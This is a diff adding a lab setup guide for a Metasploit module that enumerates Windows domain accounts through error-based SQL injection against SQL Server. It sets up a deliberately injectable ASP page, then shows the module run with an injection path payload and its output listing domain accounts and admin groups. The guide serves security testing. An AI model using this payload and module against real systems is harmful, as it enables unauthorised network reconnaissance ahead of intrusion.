@@ -1,0 +1,103 @@
+SQL Server: Enumerating Windows Domain Accounts Through SQL Server with a Low Privilege Login via Error Based SQLi
+Lab setup guide
+
+Below I've provided some basic steps for setting up a SQL Server instance that can be used to replicate the scenario exploited by the mssql_enum_domain_accounts_sqli.rb module.
+
+---------------------------
+Setup the Domain and server
+---------------------------
+1. Setup a Windows domain.  Hopefully you already have a lab setup with a Windows domain/ADS.  If not you can follow this guide to setup a DC:http://social.technet.microsoft.com/wiki/contents/articles/22622.building-your-first-domain-controller-on-2012-r2.aspx
+
+2. Next, Add a server to the domain that can be used as the sql server. http://technet.microsoft.com/en-us/library/bb456990.aspx
+
+3.	Download the Microsoft SQL Server Express install that includes SQL Server Management Studio on the system just added to the domain.  It can be download at http://msdn.microsoft.com/en-us/evalcenter/dn434042.aspx
+
+4.	Install SQL Server by following the wizard, but make sure to enabled mixed-mode authentication and run the service as LocalSystem for the sake of the lab.
+
+5. Make sure to enable the tcp protocol so that module can connect to the listener.
+http://blogs.msdn.com/b/sqlexpress/archive/2005/05/05/415084.aspx
+
+
+---------------------------
+Setup the Database
+---------------------------
+1.	Log into the SQL Server with the "sa" account setup during installation using the SQL Server Management Studio application.
+
+3.  Press the "New Query" button and use the TSQL below to create a database named "MyAppDb" for the lab. 
+
+-- Create database
+CREATE DATABASE MyAppDb
+
+2.	Press the "New Query" button and use the TSQL below to create sql login that owns the db.  
+
+-- Create login 
+CREATE LOGIN MyUser1 WITH PASSWORD = 'MyPassword!';
+
+-- Setup MyAppUser1 the db_owner role in MyAppDb
+USE MyAppDb
+ALTER LOGIN [MyUser1] with default_database = [MyAppDb];
+CREATE USER [MyUser1] FROM LOGIN [MyUser1];
+EXEC sp_addrolemember [db_owner], [MyUser1];
+
+4. Add a table with records
+
+-- Create table
+CREATE TABLE dbo.NOCList
+(ID INT IDENTITY PRIMARY KEY,SpyName varchar(MAX) NOT NULL,RealName varchar(MAX) NULL)
+
+-- Add sample records to table
+INSERT dbo.NOCList (SpyName, RealName)
+VALUES ('James Bond','Sean Connery')
+INSERT dbo.NOCList (SpyName, RealName)
+VALUES ('Ethan Hunt','Tom Cruise')
+INSERT dbo.NOCList (SpyName, RealName)
+VALUES ('Jason Bourne','Matt Damon')
+
+
+----------------
+Web Server Setup
+----------------
+1. Setup a local IIS server 
+2. Make sure its configured to process asp pages
+3. Download testing.asp to web root from https://raw.githubusercontent.com/nullbind/Metasploit-Modules/master/testing2.asp
+4. Verify the page works by accessing: http://127.0.0.1/testing2.asp?id=1
+5. Verify the id parameter is injectable and error are returned: http://127.0.0.1/testing2.asp?id=@@version
+
+------------------
+Test Module
+------------------
+
+6. Test out the metasploit module to enumerate domain accounts.  
+Note: For the test set the fuzznum to 1000, but you would set it to 10000
+or above in a real environment.
+
+use auxiliary/admin/mssql/mssql_enum_windows_domain_accounts_sqli
+msf auxiliary(mssql_enum_windows_domain_accounts_sqli) > set rhost 10.2.9.101
+msf auxiliary(mssql_enum_windows_domain_accounts_sqli) > set GET_PATH /testing2.asp?id=1+and+1=[SQLi];--
+msf auxiliary(mssql_enum_windows_domain_accounts_sqli) > run
+
+[*] 10.2.9.101:80 - Grabbing the server and domain name...
+[+] 10.2.9.101:80 - Server name: LVA
+[+] 10.2.9.101:80 - Domain name: DEMO
+[*] 10.2.9.101:80 - Grabbing the SID for the domain...
+[+] 10.2.9.101:80 - Domain sid: 0105000000000005150000009CC30DD479441EDEB31027D0
+[*] 10.2.9.101:80 - Brute forcing 1000 RIDs through the SQL Server, be patient...
+[*] 10.2.9.101:80 -  DEMO\administrator
+[*] 10.2.9.101:80 -  DEMO\Guest
+[*] 10.2.9.101:80 -  DEMO\krbtgt
+[*] 10.2.9.101:80 -  DEMO\Domain Admins
+[*] 10.2.9.101:80 -  DEMO\Domain Users
+[*] 10.2.9.101:80 -  DEMO\Domain Guests
+[*] 10.2.9.101:80 -  DEMO\Domain Computers
+[*] 10.2.9.101:80 -  DEMO\Domain Controllers
+[*] 10.2.9.101:80 -  DEMO\Cert Publishers
+[*] 10.2.9.101:80 -  DEMO\Schema Admins
+[*] 10.2.9.101:80 -  DEMO\Enterprise Admins
+[*] 10.2.9.101:80 -  DEMO\Group Policy Creator Owners
+[*] 10.2.9.101:80 -  DEMO\RAS and IAS Servers
+[*] 10.2.9.101:80 -  DEMO\HelpServicesGroup
+[+] 10.2.9.101:80 - 14 user accounts, groups, and computer accounts were found.
+[*] Query results have been saved to: /root/.msf4/loot/20141125095848_default_10.2.9.101_windows_domain_a_845435.txt
+[*] Auxiliary module execution completed
+msf auxiliary(mssql_enum_windows_domain_accounts_sqli) > 
+
